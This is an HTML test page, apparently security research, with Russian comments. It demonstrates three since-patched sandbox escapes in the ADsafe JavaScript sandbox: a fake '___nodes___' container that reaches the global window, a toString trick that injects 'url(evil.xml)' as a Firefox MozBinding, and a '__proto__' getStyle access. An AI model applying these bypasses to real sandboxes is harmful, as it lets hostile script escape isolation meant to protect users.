<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="adsafe.js"></script>
</head>
<body>
<div id="TEST_">
    <p>just for tests</p>

    <script>
        ADSAFE.id("TEST_");
    </script>
    <script>
        ADSAFE.lib("library", function (lib) {
            "use strict";
            return function () {
                alert("library hello!");
                return {};
            };
        });
    </script>

    <script>
        // Все примеры здесь проходят jslint в режиме adsafe, за исключением тех мест, где используются пропатченные баги


        // JSLint позволял следующий код, его особенность в том, что была разрешена строка, начинающаяся с 3-х подчёркиваний в качестве ключа для словаря.
        // ___nodes___ используется в adsafe в качестве массива содержащего ссылки на dom элементы, таким образом мы можем создать множество фиктивных dom элементов
        // После этого мы можем скопировать любую функцию с настоящего dom элемента на наш фиктивный элемент, нам нужна такая функция (например value), которая внутри себя будет вызывать заранее подготовленную нами функцию нашего фиктивного элемента, которая имея доступ к данным, которые были доступны и другому dom элементу сможет поиметь доступ к запрещённым объектам, в данном случае window
        // =============================================================================================================
        ADSAFE.go("TEST_", function (dom, lib) {
            "use strict";
            var myWindow, fakeNode, fakeBunch, realBunch;
            // Создаём псевдо-элемент объектной модели документа
            fakeNode = {
                appendChild: function (elt) {
                    // Получив в качестве параметра настоящий объект DOM мы можем воспользоваться им с целью получения доступа к запрещённому глобальному объекту window
                    myWindow = elt.ownerDocument.defaultView;
                },
                tagName: "div",
                value: null
            };
            // Создаём псевдо-контейнер объектов DOM
            fakeBunch = {"___nodes___": [fakeNode]};
            realBunch = dom.tag("p");
            // Заимствуем метод value у настоящего объекта DOM
            fakeBunch.value = realBunch.value;
            // Заимстованный метод вызовет внутри себя функцию appentChild для созданного псевдо-элемента и передаст ей в качестве параметра настоящий объект DOM
            fakeBunch.value("");
            // Подтвердим, что мы успешно смогли получить доступ к запрещённому свойству window из глобальной области видимости.
            myWindow.alert("hacked");
        });

        // Суть заключается в том, что javascript позволяет делать автоматическое приведение типа.
        // При добавлении стиля к какому-либо объекту DOM при помощи AdSafe происходит его проверка, что там не фигурирует какая-либо ссылка на url.
        // Проверка происходит при помощи регулярного выражения, однако если передать для проверки не строку, а объект, то будет вызвана функция toString, которую можно было собственноручно написать так, чтобы нужное количество раз т.е. при приверках она выдавала безобидные значения, а в момент вставки значения выдавала вредоносный код для внедрения.
        // Таким образом происходило внедрение вредоносной ссылки в тег style, что приводило к выполнению произвольного кода, который в ней описан.
        // Данная атака поддерживается только в Firefox, т.к. в других браузерах невозможно подключить сторонний источник подобным образом.
        // Однако могут быть другие неожиданные уязвимости связанные с автоприведением типа.
        // =============================================================================================================
        ADSAFE.go("TEST_", function (dom, lib) {
            "use strict";
            var called = 2,
                obj = {
                    // Создаём метод toString для объекта, который позволит пройти необходимые проверки внутри AdSafe при последующем вызове метода style
                    // При этом в нужный момент будет возвращена строка содержащая вредоносное значение
                    "toString": function () {
                        var ret = "";
                        if (called === 0) {
                            ret = "url(evil.xml)";
                        } else {
                            called = called - 1;
                            ret = "dummy";
                        }
                        return ret;
                    }
                };
            dom.append(dom.tag("h1"));
            // Внутри реализации функции style будет выполнено несколько проверок, после чего значение передаваемго объекта obj, конвертированное в строку, будет вставлено в элемент DOM
            dom.q("h1").style("MozBinding", obj);
        });

        // Раньше getStyle имел код без проверки того, что передаётся в качестве параметра, в итоге можно было передать что-то особенное, и в итоге получить доступ к данным прототипа стиля
        // Фактически мы получали доступ к данным которые используются во всех стилях на странице, тем самым получив косвенный доступ к стилям за пределами сендбокса
        // теперь getStyle вызывает функцию reject_name
        // Так же было найденно ещё несколько мест, где использовался параметр, без проверки reject_name, например в строке "adsafe_lib[name] = f(adsafe_lib);" в AdSafe
        //  однако это не приводило к явной уязвимости и классифицировалось как bug.
        // =============================================================================================================
        ADSAFE.go("TEST_", function (dom, lib) {
            "use strict";
            var ss = "__pr",
                all_tags_style_proto = dom.tag("p").getStyle(ss + "oto__");
        });

    </script>
</div>
</body>
</html>